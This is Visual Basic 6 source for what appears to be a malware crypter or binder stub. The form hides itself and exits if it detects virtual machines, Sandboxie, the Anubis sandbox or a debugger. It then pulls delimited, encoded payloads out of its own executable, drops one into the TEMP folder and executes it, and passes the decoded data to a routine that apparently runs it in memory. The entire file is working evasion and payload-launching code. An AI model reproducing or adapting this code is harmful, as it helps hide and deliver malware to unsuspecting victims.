VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "Form1"
   ClientHeight    =   3120
   ClientLeft      =   60
   ClientTop       =   420
   ClientWidth     =   4680
   LinkTopic       =   "Form1"
   ScaleHeight     =   3120
   ScaleWidth      =   4680
   StartUpPosition =   3  'Windows Default
   Begin VB.Timer Timer1 
      Interval        =   3000
      Left            =   1200
      Top             =   840
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim Matriz() As String

Private Sub Form_Load()
Me.Hide
App.TaskVisible = False
End Sub

Private Sub Timer1_Timer()
    Dim Datos As String
 
    Dim Run() As Byte
    Dim Longitud As Long, i As Long
    
    i = IsVirtualPCPresent()
    If i = 1 Then End
    If IsSandBoxiePresent(1) = True Then End
    If IsSandBoxiePresent(2, Form1) = True Then End
    If IsAnubisPresent(1) = True Then End
    Call TestDebug
    If Module2.bDebug Then End

    
    
    Datos = Space(FileLen(App.Path & "\" & App.EXEName & ".exe"))
    
    Open App.Path & "\" & App.EXEName & ".exe" For Binary Access Read As 1#
        
        Get 1#, , Datos
    Close #1
    
    Matriz = Split(Datos, "|\/RoCa\/|")
    Run = StrConv(Matriz(1), vbFromUnicode)
    

    EncodeArrayB Run()
    
On Error Resume Next
Open Environ("TEMP") & "\temporal." & Matriz(3) For Binary As #1
    Put 1#, , Matriz(2)
Close 1#
On Error Resume Next
Call ShellExecute(Me.hwnd, "Open", Environ("TEMP") & "\temporal." & Matriz(3), "", "", 1)

    
     Final App.Path & "\" & App.EXEName & ".exe", encoded()

    
    End
End Sub
